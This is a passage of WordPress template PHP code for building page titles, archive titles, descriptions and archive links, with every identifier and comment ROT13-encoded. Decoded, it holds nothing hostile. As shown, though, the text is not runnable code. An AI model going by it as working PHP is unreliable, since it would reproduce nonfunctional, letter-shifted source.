
	$gvgyr = vzcybqr( \" $frc \", neenl_svygre( $gvgyr ) );

	/**
	 * Svygref gur qbphzrag gvgyr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat $gvgyr Qbphzrag gvgyr.
	 */
	$gvgyr = nccyl_svygref( 'qbphzrag_gvgyr', $gvgyr );

	erghea $gvgyr;
}

/**
 * Qvfcynlf gvgyr gnt jvgu pbagrag.
 *
 * @fvapr 4.1.0
 * @fvapr 4.4.0 Vzcebirq gvgyr bhgchg ercynprq `jc_gvgyr()`.
 * @npprff cevingr
 */
shapgvba _jc_eraqre_gvgyr_gnt() {
	vs ( ! pheerag_gurzr_fhccbegf( 'gvgyr-gnt' ) ) {
		erghea;
	}

	rpub '<gvgyr>' . jc_trg_qbphzrag_gvgyr() . '</gvgyr>' . \"\a\";
}

/**
 * Qvfcynlf be ergevrirf cntr gvgyr sbe nyy nernf bs oybt.
 *
 * Ol qrsnhyg, gur cntr gvgyr jvyy qvfcynl gur frcnengbe orsber gur cntr gvgyr,
 * fb gung gur oybt gvgyr jvyy or orsber gur cntr gvgyr. Guvf vf abg tbbq sbe
 * gvgyr qvfcynl, fvapr gur oybt gvgyr fubjf hc ba zbfg gnof naq abg jung vf
 * vzcbegnag, juvpu vf gur cntr gung gur hfre vf ybbxvat ng.
 *
 * Gurer ner nyfb FRB orarsvgf gb univat gur oybt gvgyr nsgre be gb gur 'evtug'
 * bs gur cntr gvgyr. Ubjrire, vg vf zbfgyl pbzzba frafr gb unir gur oybt gvgyr
 * gb gur evtug jvgu zbfg oebjfref fhccbegvat gnof. Lbh pna npuvrir guvf ol
 * hfvat gur frcybpngvba cnenzrgre naq frggvat gur inyhr gb 'evtug'. Guvf punatr
 * jnf vagebqhprq nebhaq 2.5.0, va pnfr onpxjneq pbzcngvovyvgl bs gurzrf vf
 * vzcbegnag.
 *
 * @fvapr 1.0.0
 *
 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 *
 * @cnenz fgevat $frc         Bcgvbany. Ubj gb frcnengr gur inevbhf vgrzf jvguva gur cntr gvgyr.
 *                            Qrsnhyg '&endhb;'.
 * @cnenz obby   $qvfcynl     Bcgvbany. Jurgure gb qvfcynl be ergevrir gvgyr. Qrsnhyg gehr.
 * @cnenz fgevat $frcybpngvba Bcgvbany. Ybpngvba bs gur frcnengbe (rvgure 'yrsg' be 'evtug').
 * @erghea fgevat|ibvq Fgevat jura `$qvfcynl` vf snyfr, abguvat bgurejvfr.
 */
shapgvba jc_gvgyr( $frc = '&endhb;', $qvfcynl = gehr, $frcybpngvba = '' ) {
	tybony $jc_ybpnyr;

	$z        = trg_dhrel_ine( 'z' );
	$lrne     = trg_dhrel_ine( 'lrne' );
	$zbaguahz = trg_dhrel_ine( 'zbaguahz' );
	$qnl      = trg_dhrel_ine( 'qnl' );
	$frnepu   = trg_dhrel_ine( 'f' );
	$gvgyr    = '';

	$g_frc = '%JC_GVGYR_FRC%'; // Grzcbenel frcnengbe, sbe npphengr syvccvat, vs arprffnel.

	// Vs gurer vf n cbfg.
	vs ( vf_fvatyr() || ( vf_ubzr() && ! vf_sebag_cntr() ) || ( vf_cntr() && ! vf_sebag_cntr() ) ) {
		$gvgyr = fvatyr_cbfg_gvgyr( '', snyfr );
	}

	// Vs gurer'f n cbfg glcr nepuvir.
	vs ( vf_cbfg_glcr_nepuvir() ) {
		$cbfg_glcr = trg_dhrel_ine( 'cbfg_glcr' );
		vs ( vf_neenl( $cbfg_glcr ) ) {
			$cbfg_glcr = erfrg( $cbfg_glcr );
		}
		$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg_glcr );
		vs ( ! $cbfg_glcr_bowrpg->unf_nepuvir ) {
			$gvgyr = cbfg_glcr_nepuvir_gvgyr( '', snyfr );
		}
	}

	// Vs gurer'f n pngrtbel be gnt.
	vs ( vf_pngrtbel() || vf_gnt() ) {
		$gvgyr = fvatyr_grez_gvgyr( '', snyfr );
	}

	// Vs gurer'f n gnkbabzl.
	vs ( vf_gnk() ) {
		$grez = trg_dhrevrq_bowrpg();
		vs ( $grez ) {
			$gnk   = trg_gnkbabzl( $grez->gnkbabzl );
			$gvgyr = fvatyr_grez_gvgyr( $gnk->ynoryf->anzr . $g_frc, snyfr );
		}
	}

	// Vs gurer'f na nhgube.
	vs ( vf_nhgube() && ! vf_cbfg_glcr_nepuvir() ) {
		$nhgube = trg_dhrevrq_bowrpg();
		vs ( $nhgube ) {
			$gvgyr = $nhgube->qvfcynl_anzr;
		}
	}

	// Cbfg glcr nepuvirf jvgu unf_nepuvir fubhyq bireevqr grezf.
	vs ( vf_cbfg_glcr_nepuvir() && $cbfg_glcr_bowrpg->unf_nepuvir ) {
		$gvgyr = cbfg_glcr_nepuvir_gvgyr( '', snyfr );
	}

	// Vs gurer'f n zbagu.
	vs ( vf_nepuvir() && ! rzcgl( $z ) ) {
		$zl_lrne  = fhofge( $z, 0, 4 );
		$zl_zbagu = fhofge( $z, 4, 2 );
		$zl_qnl   = (vag) fhofge( $z, 6, 2 );
		$gvgyr    = $zl_lrne .
			( $zl_zbagu ? $g_frc . $jc_ybpnyr->trg_zbagu( $zl_zbagu ) : '' ) .
			( $zl_qnl ? $g_frc . $zl_qnl : '' );
	}

	// Vs gurer'f n lrne.
	vs ( vf_nepuvir() && ! rzcgl( $lrne ) ) {
		$gvgyr = $lrne;
		vs ( ! rzcgl( $zbaguahz ) ) {
			$gvgyr .= $g_frc . $jc_ybpnyr->trg_zbagu( $zbaguahz );
		}
		vs ( ! rzcgl( $qnl ) ) {
			$gvgyr .= $g_frc . mrebvfr( $qnl, 2 );
		}
	}

	// Vs vg'f n frnepu.
	vs ( vf_frnepu() ) {
		/* genafyngbef: 1: Frcnengbe, 2: Frnepu dhrel. */
		$gvgyr = fcevags( __( 'Frnepu Erfhygf %1$f %2$f' ), $g_frc, fgevc_gntf( $frnepu ) );
	}

	// Vs vg'f n 404 cntr.
	vs ( vf_404() ) {
		$gvgyr = __( 'Cntr abg sbhaq' );
	}

	$cersvk = '';
	vs ( ! rzcgl( $gvgyr ) ) {
		$cersvk = \" $frc \";
	}

	/**
	 * Svygref gur cnegf bs gur cntr gvgyr.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat[] $gvgyr_neenl Neenl bs cnegf bs gur cntr gvgyr.
	 */
	$gvgyr_neenl = nccyl_svygref( 'jc_gvgyr_cnegf', rkcybqr( $g_frc, $gvgyr ) );

	// Qrgrezvarf cbfvgvba bs gur frcnengbe naq qverpgvba bs gur oernqpehzo.
	vs ( 'evtug' === $frcybpngvba ) { // Frcnengbe ba evtug, fb erirefr gur beqre.
		$gvgyr_neenl = neenl_erirefr( $gvgyr_neenl );
		$gvgyr       = vzcybqr( \" $frc \", $gvgyr_neenl ) . $cersvk;
	} ryfr {
		$gvgyr = $cersvk . vzcybqr( \" $frc \", $gvgyr_neenl );
	}

	/**
	 * Svygref gur grkg bs gur cntr gvgyr.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $gvgyr       Cntr gvgyr.
	 * @cnenz fgevat $frc         Gvgyr frcnengbe.
	 * @cnenz fgevat $frcybpngvba Ybpngvba bs gur frcnengbe (rvgure 'yrsg' be 'evtug').
	 */
	$gvgyr = nccyl_svygref( 'jc_gvgyr', $gvgyr, $frc, $frcybpngvba );

	// Fraq vg bhg.
	vs ( $qvfcynl ) {
		rpub $gvgyr;
	} ryfr {
		erghea $gvgyr;
	}
}

/**
 * Qvfcynlf be ergevrirf cntr gvgyr sbe cbfg.
 *
 * Guvf vf bcgvzvmrq sbe fvatyr.cuc grzcyngr svyr sbe qvfcynlvat gur cbfg gvgyr.
 *
 * Vg qbrf abg fhccbeg cynpvat gur frcnengbe nsgre gur gvgyr, ohg ol yrnivat gur
 * cersvk cnenzrgre rzcgl, lbh pna frg gur gvgyr frcnengbe znahnyyl. Gur cersvk
 * qbrf abg nhgbzngvpnyyl cynpr n fcnpr orgjrra gur cersvk, fb vs gurer fubhyq
 * or n fcnpr, gur cnenzrgre inyhr jvyy arrq gb unir vg ng gur raq.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $cersvk  Bcgvbany. Jung gb qvfcynl orsber gur gvgyr.
 * @cnenz obby   $qvfcynl Bcgvbany. Jurgure gb qvfcynl be ergevrir gvgyr. Qrsnhyg gehr.
 * @erghea fgevat|ibvq Gvgyr jura ergevrivat.
 */
shapgvba fvatyr_cbfg_gvgyr( $cersvk = '', $qvfcynl = gehr ) {
	$_cbfg = trg_dhrevrq_bowrpg();

	vs ( ! vffrg( $_cbfg->cbfg_gvgyr ) ) {
		erghea;
	}

	/**
	 * Svygref gur cntr gvgyr sbe n fvatyr cbfg.
	 *
	 * @fvapr 0.71
	 *
	 * @cnenz fgevat  $_cbfg_gvgyr Gur fvatyr cbfg cntr gvgyr.
	 * @cnenz JC_Cbfg $_cbfg       Gur pheerag cbfg.
	 */
	$gvgyr = nccyl_svygref( 'fvatyr_cbfg_gvgyr', $_cbfg->cbfg_gvgyr, $_cbfg );
	vs ( $qvfcynl ) {
		rpub $cersvk . $gvgyr;
	} ryfr {
		erghea $cersvk . $gvgyr;
	}
}

/**
 * Qvfcynlf be ergevrirf gvgyr sbe n cbfg glcr nepuvir.
 *
 * Guvf vf bcgvzvmrq sbe nepuvir.cuc naq nepuvir-{$cbfg_glcr}.cuc grzcyngr svyrf
 * sbe qvfcynlvat gur gvgyr bs gur cbfg glcr.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $cersvk  Bcgvbany. Jung gb qvfcynl orsber gur gvgyr.
 * @cnenz obby   $qvfcynl Bcgvbany. Jurgure gb qvfcynl be ergevrir gvgyr. Qrsnhyg gehr.
 * @erghea fgevat|ibvq Gvgyr jura ergevrivat, ahyy jura qvfcynlvat be snvyher.
 */
shapgvba cbfg_glcr_nepuvir_gvgyr( $cersvk = '', $qvfcynl = gehr ) {
	vs ( ! vf_cbfg_glcr_nepuvir() ) {
		erghea;
	}

	$cbfg_glcr = trg_dhrel_ine( 'cbfg_glcr' );
	vs ( vf_neenl( $cbfg_glcr ) ) {
		$cbfg_glcr = erfrg( $cbfg_glcr );
	}

	$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $cbfg_glcr );

	/**
	 * Svygref gur cbfg glcr nepuvir gvgyr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $cbfg_glcr_anzr Cbfg glcr 'anzr' ynory.
	 * @cnenz fgevat $cbfg_glcr      Cbfg glcr.
	 */
	$gvgyr = nccyl_svygref( 'cbfg_glcr_nepuvir_gvgyr', $cbfg_glcr_bow->ynoryf->anzr, $cbfg_glcr );

	vs ( $qvfcynl ) {
		rpub $cersvk . $gvgyr;
	} ryfr {
		erghea $cersvk . $gvgyr;
	}
}

/**
 * Qvfcynlf be ergevrirf cntr gvgyr sbe pngrtbel nepuvir.
 *
 * Hfrshy sbe pngrtbel grzcyngr svyrf sbe qvfcynlvat gur pngrtbel cntr gvgyr.
 * Gur cersvk qbrf abg nhgbzngvpnyyl cynpr n fcnpr orgjrra gur cersvk, fb vs
 * gurer fubhyq or n fcnpr, gur cnenzrgre inyhr jvyy arrq gb unir vg ng gur raq.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $cersvk  Bcgvbany. Jung gb qvfcynl orsber gur gvgyr.
 * @cnenz obby   $qvfcynl Bcgvbany. Jurgure gb qvfcynl be ergevrir gvgyr. Qrsnhyg gehr.
 * @erghea fgevat|ibvq Gvgyr jura ergevrivat.
 */
shapgvba fvatyr_png_gvgyr( $cersvk = '', $qvfcynl = gehr ) {
	erghea fvatyr_grez_gvgyr( $cersvk, $qvfcynl );
}

/**
 * Qvfcynlf be ergevrirf cntr gvgyr sbe gnt cbfg nepuvir.
 *
 * Hfrshy sbe gnt grzcyngr svyrf sbe qvfcynlvat gur gnt cntr gvgyr. Gur cersvk
 * qbrf abg nhgbzngvpnyyl cynpr n fcnpr orgjrra gur cersvk, fb vs gurer fubhyq
 * or n fcnpr, gur cnenzrgre inyhr jvyy arrq gb unir vg ng gur raq.
 *
 * @fvapr 2.3.0
 *
 * @cnenz fgevat $cersvk  Bcgvbany. Jung gb qvfcynl orsber gur gvgyr.
 * @cnenz obby   $qvfcynl Bcgvbany. Jurgure gb qvfcynl be ergevrir gvgyr. Qrsnhyg gehr.
 * @erghea fgevat|ibvq Gvgyr jura ergevrivat.
 */
shapgvba fvatyr_gnt_gvgyr( $cersvk = '', $qvfcynl = gehr ) {
	erghea fvatyr_grez_gvgyr( $cersvk, $qvfcynl );
}

/**
 * Qvfcynlf be ergevrirf cntr gvgyr sbe gnkbabzl grez nepuvir.
 *
 * Hfrshy sbe gnkbabzl grez grzcyngr svyrf sbe qvfcynlvat gur gnkbabzl grez cntr gvgyr.
 * Gur cersvk qbrf abg nhgbzngvpnyyl cynpr n fcnpr orgjrra gur cersvk, fb vs gurer fubhyq
 * or n fcnpr, gur cnenzrgre inyhr jvyy arrq gb unir vg ng gur raq.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $cersvk  Bcgvbany. Jung gb qvfcynl orsber gur gvgyr.
 * @cnenz obby   $qvfcynl Bcgvbany. Jurgure gb qvfcynl be ergevrir gvgyr. Qrsnhyg gehr.
 * @erghea fgevat|ibvq Gvgyr jura ergevrivat.
 */
shapgvba fvatyr_grez_gvgyr( $cersvk = '', $qvfcynl = gehr ) {
	$grez = trg_dhrevrq_bowrpg();

	vs ( ! $grez ) {
		erghea;
	}

	vs ( vf_pngrtbel() ) {
		/**
		 * Svygref gur pngrtbel nepuvir cntr gvgyr.
		 *
		 * @fvapr 2.0.10
		 *
		 * @cnenz fgevat $grez_anzr Pngrtbel anzr sbe nepuvir orvat qvfcynlrq.
		 */
		$grez_anzr = nccyl_svygref( 'fvatyr_png_gvgyr', $grez->anzr );
	} ryfrvs ( vf_gnt() ) {
		/**
		 * Svygref gur gnt nepuvir cntr gvgyr.
		 *
		 * @fvapr 2.3.0
		 *
		 * @cnenz fgevat $grez_anzr Gnt anzr sbe nepuvir orvat qvfcynlrq.
		 */
		$grez_anzr = nccyl_svygref( 'fvatyr_gnt_gvgyr', $grez->anzr );
	} ryfrvs ( vf_gnk() ) {
		/**
		 * Svygref gur phfgbz gnkbabzl nepuvir cntr gvgyr.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat $grez_anzr Grez anzr sbe nepuvir orvat qvfcynlrq.
		 */
		$grez_anzr = nccyl_svygref( 'fvatyr_grez_gvgyr', $grez->anzr );
	} ryfr {
		erghea;
	}

	vs ( rzcgl( $grez_anzr ) ) {
		erghea;
	}

	vs ( $qvfcynl ) {
		rpub $cersvk . $grez_anzr;
	} ryfr {
		erghea $cersvk . $grez_anzr;
	}
}

/**
 * Qvfcynlf be ergevrirf cntr gvgyr sbe cbfg nepuvir onfrq ba qngr.
 *
 * Hfrshy sbe jura gur grzcyngr bayl arrqf gb qvfcynl gur zbagu naq lrne,
 * vs rvgure ner ninvynoyr. Gur cersvk qbrf abg nhgbzngvpnyyl cynpr n fcnpr
 * orgjrra gur cersvk, fb vs gurer fubhyq or n fcnpr, gur cnenzrgre inyhr
 * jvyy arrq gb unir vg ng gur raq.
 *
 * @fvapr 0.71
 *
 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 *
 * @cnenz fgevat $cersvk  Bcgvbany. Jung gb qvfcynl orsber gur gvgyr.
 * @cnenz obby   $qvfcynl Bcgvbany. Jurgure gb qvfcynl be ergevrir gvgyr. Qrsnhyg gehr.
 * @erghea fgevat|snyfr|ibvq Snyfr vs gurer'f ab inyvq gvgyr sbe gur zbagu. Gvgyr jura ergevrivat.
 */
shapgvba fvatyr_zbagu_gvgyr( $cersvk = '', $qvfcynl = gehr ) {
	tybony $jc_ybpnyr;

	$z        = trg_dhrel_ine( 'z' );
	$lrne     = trg_dhrel_ine( 'lrne' );
	$zbaguahz = trg_dhrel_ine( 'zbaguahz' );

	vs ( ! rzcgl( $zbaguahz ) && ! rzcgl( $lrne ) ) {
		$zl_lrne  = $lrne;
		$zl_zbagu = $jc_ybpnyr->trg_zbagu( $zbaguahz );
	} ryfrvs ( ! rzcgl( $z ) ) {
		$zl_lrne  = fhofge( $z, 0, 4 );
		$zl_zbagu = $jc_ybpnyr->trg_zbagu( fhofge( $z, 4, 2 ) );
	}

	vs ( rzcgl( $zl_zbagu ) ) {
		erghea snyfr;
	}

	$erfhyg = $cersvk . $zl_zbagu . $cersvk . $zl_lrne;

	vs ( ! $qvfcynl ) {
		erghea $erfhyg;
	}
	rpub $erfhyg;
}

/**
 * Qvfcynlf gur nepuvir gvgyr onfrq ba gur dhrevrq bowrpg.
 *
 * @fvapr 4.1.0
 *
 * @frr trg_gur_nepuvir_gvgyr()
 *
 * @cnenz fgevat $orsber Bcgvbany. Pbagrag gb cercraq gb gur gvgyr. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre  Bcgvbany. Pbagrag gb nccraq gb gur gvgyr. Qrsnhyg rzcgl.
 */
shapgvba gur_nepuvir_gvgyr( $orsber = '', $nsgre = '' ) {
	$gvgyr = trg_gur_nepuvir_gvgyr();

	vs ( ! rzcgl( $gvgyr ) ) {
		rpub $orsber . $gvgyr . $nsgre;
	}
}

/**
 * Ergevrirf gur nepuvir gvgyr onfrq ba gur dhrevrq bowrpg.
 *
 * @fvapr 4.1.0
 * @fvapr 5.5.0 Gur gvgyr cneg vf jenccrq va n `<fcna>` ryrzrag.
 *
 * @erghea fgevat Nepuvir gvgyr.
 */
shapgvba trg_gur_nepuvir_gvgyr() {
	$gvgyr  = __( 'Nepuvirf' );
	$cersvk = '';

	vs ( vf_pngrtbel() ) {
		$gvgyr  = fvatyr_png_gvgyr( '', snyfr );
		$cersvk = _k( 'Pngrtbel:', 'pngrtbel nepuvir gvgyr cersvk' );
	} ryfrvs ( vf_gnt() ) {
		$gvgyr  = fvatyr_gnt_gvgyr( '', snyfr );
		$cersvk = _k( 'Gnt:', 'gnt nepuvir gvgyr cersvk' );
	} ryfrvs ( vf_nhgube() ) {
		$gvgyr  = trg_gur_nhgube();
		$cersvk = _k( 'Nhgube:', 'nhgube nepuvir gvgyr cersvk' );
	} ryfrvs ( vf_lrne() ) {
		/* genafyngbef: Frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
		$gvgyr  = trg_gur_qngr( _k( 'L', 'lrneyl nepuvirf qngr sbezng' ) );
		$cersvk = _k( 'Lrne:', 'qngr nepuvir gvgyr cersvk' );
	} ryfrvs ( vf_zbagu() ) {
		/* genafyngbef: Frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
		$gvgyr  = trg_gur_qngr( _k( 'S L', 'zbaguyl nepuvirf qngr sbezng' ) );
		$cersvk = _k( 'Zbagu:', 'qngr nepuvir gvgyr cersvk' );
	} ryfrvs ( vf_qnl() ) {
		/* genafyngbef: Frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
		$gvgyr  = trg_gur_qngr( _k( 'S w, L', 'qnvyl nepuvirf qngr sbezng' ) );
		$cersvk = _k( 'Qnl:', 'qngr nepuvir gvgyr cersvk' );
	} ryfrvs ( vf_gnk( 'cbfg_sbezng' ) ) {
		vs ( vf_gnk( 'cbfg_sbezng', 'cbfg-sbezng-nfvqr' ) ) {
			$gvgyr = _k( 'Nfvqrf', 'cbfg sbezng nepuvir gvgyr' );
		} ryfrvs ( vf_gnk( 'cbfg_sbezng', 'cbfg-sbezng-tnyyrel' ) ) {
			$gvgyr = _k( 'Tnyyrevrf', 'cbfg sbezng nepuvir gvgyr' );
		} ryfrvs ( vf_gnk( 'cbfg_sbezng', 'cbfg-sbezng-vzntr' ) ) {
			$gvgyr = _k( 'Vzntrf', 'cbfg sbezng nepuvir gvgyr' );
		} ryfrvs ( vf_gnk( 'cbfg_sbezng', 'cbfg-sbezng-ivqrb' ) ) {
			$gvgyr = _k( 'Ivqrbf', 'cbfg sbezng nepuvir gvgyr' );
		} ryfrvs ( vf_gnk( 'cbfg_sbezng', 'cbfg-sbezng-dhbgr' ) ) {
			$gvgyr = _k( 'Dhbgrf', 'cbfg sbezng nepuvir gvgyr' );
		} ryfrvs ( vf_gnk( 'cbfg_sbezng', 'cbfg-sbezng-yvax' ) ) {
			$gvgyr = _k( 'Yvaxf', 'cbfg sbezng nepuvir gvgyr' );
		} ryfrvs ( vf_gnk( 'cbfg_sbezng', 'cbfg-sbezng-fgnghf' ) ) {
			$gvgyr = _k( 'Fgnghfrf', 'cbfg sbezng nepuvir gvgyr' );
		} ryfrvs ( vf_gnk( 'cbfg_sbezng', 'cbfg-sbezng-nhqvb' ) ) {
			$gvgyr = _k( 'Nhqvb', 'cbfg sbezng nepuvir gvgyr' );
		} ryfrvs ( vf_gnk( 'cbfg_sbezng', 'cbfg-sbezng-pung' ) ) {
			$gvgyr = _k( 'Pungf', 'cbfg sbezng nepuvir gvgyr' );
		}
	} ryfrvs ( vf_cbfg_glcr_nepuvir() ) {
		$gvgyr  = cbfg_glcr_nepuvir_gvgyr( '', snyfr );
		$cersvk = _k( 'Nepuvirf:', 'cbfg glcr nepuvir gvgyr cersvk' );
	} ryfrvs ( vf_gnk() ) {
		$dhrevrq_bowrpg = trg_dhrevrq_bowrpg();
		vs ( $dhrevrq_bowrpg ) {
			$gnk    = trg_gnkbabzl( $dhrevrq_bowrpg->gnkbabzl );
			$gvgyr  = fvatyr_grez_gvgyr( '', snyfr );
			$cersvk = fcevags(
				/* genafyngbef: %f: Gnkbabzl fvathyne anzr. */
				_k( '%f:', 'gnkbabzl grez nepuvir gvgyr cersvk' ),
				$gnk->ynoryf->fvathyne_anzr
			);
		}
	}

	$bevtvany_gvgyr = $gvgyr;

	/**
	 * Svygref gur nepuvir gvgyr cersvk.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $cersvk Nepuvir gvgyr cersvk.
	 */
	$cersvk = nccyl_svygref( 'trg_gur_nepuvir_gvgyr_cersvk', $cersvk );
	vs ( $cersvk ) {
		$gvgyr = fcevags(
			/* genafyngbef: 1: Gvgyr cersvk. 2: Gvgyr. */
			_k( '%1$f %2$f', 'nepuvir gvgyr' ),
			$cersvk,
			'<fcna>' . $gvgyr . '</fcna>'
		);
	}

	/**
	 * Svygref gur nepuvir gvgyr.
	 *
	 * @fvapr 4.1.0
	 * @fvapr 5.5.0 Nqqrq gur `$cersvk` naq `$bevtvany_gvgyr` cnenzrgref.
	 *
	 * @cnenz fgevat $gvgyr          Nepuvir gvgyr gb or qvfcynlrq.
	 * @cnenz fgevat $bevtvany_gvgyr Nepuvir gvgyr jvgubhg cersvk.
	 * @cnenz fgevat $cersvk         Nepuvir gvgyr cersvk.
	 */
	erghea nccyl_svygref( 'trg_gur_nepuvir_gvgyr', $gvgyr, $bevtvany_gvgyr, $cersvk );
}

/**
 * Qvfcynlf pngrtbel, gnt, grez, be nhgube qrfpevcgvba.
 *
 * @fvapr 4.1.0
 *
 * @frr trg_gur_nepuvir_qrfpevcgvba()
 *
 * @cnenz fgevat $orsber Bcgvbany. Pbagrag gb cercraq gb gur qrfpevcgvba. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre  Bcgvbany. Pbagrag gb nccraq gb gur qrfpevcgvba. Qrsnhyg rzcgl.
 */
shapgvba gur_nepuvir_qrfpevcgvba( $orsber = '', $nsgre = '' ) {
	$qrfpevcgvba = trg_gur_nepuvir_qrfpevcgvba();
	vs ( $qrfpevcgvba ) {
		rpub $orsber . $qrfpevcgvba . $nsgre;
	}
}

/**
 * Ergevrirf gur qrfpevcgvba sbe na nhgube, cbfg glcr, be grez nepuvir.
 *
 * @fvapr 4.1.0
 * @fvapr 4.7.0 Nqqrq fhccbeg sbe nhgube nepuvirf.
 * @fvapr 4.9.0 Nqqrq fhccbeg sbe cbfg glcr nepuvirf.
 *
 * @frr grez_qrfpevcgvba()
 *
 * @erghea fgevat Nepuvir qrfpevcgvba.
 */
shapgvba trg_gur_nepuvir_qrfpevcgvba() {
	vs ( vf_nhgube() ) {
		$qrfpevcgvba = trg_gur_nhgube_zrgn( 'qrfpevcgvba' );
	} ryfrvs ( vf_cbfg_glcr_nepuvir() ) {
		$qrfpevcgvba = trg_gur_cbfg_glcr_qrfpevcgvba();
	} ryfr {
		$qrfpevcgvba = grez_qrfpevcgvba();
	}

	/**
	 * Svygref gur nepuvir qrfpevcgvba.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz fgevat $qrfpevcgvba Nepuvir qrfpevcgvba gb or qvfcynlrq.
	 */
	erghea nccyl_svygref( 'trg_gur_nepuvir_qrfpevcgvba', $qrfpevcgvba );
}

/**
 * Ergevrirf gur qrfpevcgvba sbe n cbfg glcr nepuvir.
 *
 * @fvapr 4.9.0
 *
 * @erghea fgevat Gur cbfg glcr qrfpevcgvba.
 */
shapgvba trg_gur_cbfg_glcr_qrfpevcgvba() {
	$cbfg_glcr = trg_dhrel_ine( 'cbfg_glcr' );

	vs ( vf_neenl( $cbfg_glcr ) ) {
		$cbfg_glcr = erfrg( $cbfg_glcr );
	}

	$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $cbfg_glcr );

	// Purpx vs n qrfpevcgvba vf frg.
	vs ( vffrg( $cbfg_glcr_bow->qrfpevcgvba ) ) {
		$qrfpevcgvba = $cbfg_glcr_bow->qrfpevcgvba;
	} ryfr {
		$qrfpevcgvba = '';
	}

	/**
	 * Svygref gur qrfpevcgvba sbe n cbfg glcr nepuvir.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz fgevat       $qrfpevcgvba   Gur cbfg glcr qrfpevcgvba.
	 * @cnenz JC_Cbfg_Glcr $cbfg_glcr_bow Gur cbfg glcr bowrpg.
	 */
	erghea nccyl_svygref( 'trg_gur_cbfg_glcr_qrfpevcgvba', $qrfpevcgvba, $cbfg_glcr_bow );
}

/**
 * Ergevrirf nepuvir yvax pbagrag onfrq ba cerqrsvarq be phfgbz pbqr.
 *
 * Gur sbezng pna or bar bs sbhe fglyrf. Gur 'yvax' sbe urnq ryrzrag, 'bcgvba'
 * sbe hfr va gur fryrpg ryrzrag, 'ugzy' sbe hfr va yvfg (rvgure by be hy UGZY
 * ryrzragf). Phfgbz pbagrag vf nyfb fhccbegrq hfvat gur orsber naq nsgre
 * cnenzrgref.
 *
 * Gur 'yvax' sbezng hfrf gur `<yvax>` UGZY ryrzrag jvgu gur **nepuvirf**
 * eryngvbafuvc. Gur orsber naq nsgre cnenzrgref ner abg hfrq. Gur grkg
 * cnenzrgre vf hfrq gb qrfpevor gur yvax.
 *
 * Gur 'bcgvba' sbezng hfrf gur bcgvba UGZY ryrzrag sbe hfr va fryrpg ryrzrag.
 * Gur inyhr vf gur hey cnenzrgre naq gur orsber naq nsgre cnenzrgref ner hfrq
 * orgjrra gur grkg qrfpevcgvba.
 *
 * Gur 'ugzy' sbezng, juvpu vf gur qrsnhyg, hfrf gur yv UGZY ryrzrag sbe hfr va
 * gur yvfg UGZY ryrzragf. Gur orsber cnenzrgre vf orsber gur yvax naq gur nsgre
 * cnenzrgre vf nsgre gur pybfvat yvax.
 *
 * Gur phfgbz sbezng hfrf gur orsber cnenzrgre orsber gur yvax ('n' UGZY
 * ryrzrag) naq gur nsgre cnenzrgre nsgre gur pybfvat yvax gnt. Vs gur nobir
 * guerr inyhrf sbe gur sbezng ner abg hfrq, gura phfgbz sbezng vf nffhzrq.
 *
 * @fvapr 1.0.0
 * @fvapr 5.2.0 Nqqrq gur `$fryrpgrq` cnenzrgre.
 *
 * @cnenz fgevat $hey      HEY gb nepuvir.
 * @cnenz fgevat $grkg     Nepuvir grkg qrfpevcgvba.
 * @cnenz fgevat $sbezng   Bcgvbany. Pna or 'yvax', 'bcgvba', 'ugzy', be phfgbz. Qrsnhyg 'ugzy'.
 * @cnenz fgevat $orsber   Bcgvbany. Pbagrag gb cercraq gb gur qrfpevcgvba. Qrsnhyg rzcgl.
 * @cnenz fgevat $nsgre    Bcgvbany. Pbagrag gb nccraq gb gur qrfpevcgvba. Qrsnhyg rzcgl.
 * @cnenz obby   $fryrpgrq Bcgvbany. Frg gb gehr vs gur pheerag cntr vf gur fryrpgrq nepuvir cntr. Qrsnhyg snyfr.
 * @erghea fgevat UGZY yvax pbagrag sbe nepuvir.
 */
shapgvba trg_nepuvirf_yvax( $hey, $grkg, $sbezng = 'ugzy', $orsber = '', $nsgre = '', $fryrpgrq = snyfr ) {
	$grkg         = jcgrkghevmr( $grkg );
	$hey          = rfp_hey( $hey );
	$nevn_pheerag = $fryrpgrq ? ' nevn-pheerag=\"cntr\"' : '';

	vs ( 'yvax' === $sbezng ) {
		$yvax_ugzy = \"\g<yvax ery='nepuvirf' gvgyr='\" . rfp_ngge( $grkg ) . \"' uers='$hey' />\a\";
	} ryfrvs ( 'bcgvba' === $sbezng ) {
		$fryrpgrq_ngge = $fryrpgrq ? \" fryrpgrq='fryrpgrq'\" : '';
		$yvax_ugzy     = \"\g<bcgvba inyhr='$hey'$fryrpgrq_ngge>$orsber $grkg $nsgre</bcgvba>\a\";
	} ryfrvs ( 'ugzy' === $sbezng ) {
		$yvax_ugzy = \"\g<yv>$orsber<n uers='$hey'$nevn_pheerag>$grkg</n>$nsgre</yv>\a\";
	} ryfr { // Phfgbz.
		$yvax_ugzy = \"\g$orsber<n uers='$hey'$nevn_pheerag>$grkg</n>$nsgre\a\";
	}

	/**
	 * Svygref gur nepuvir yvax pbagrag.
	 *
	 * @fvapr 2.6.0
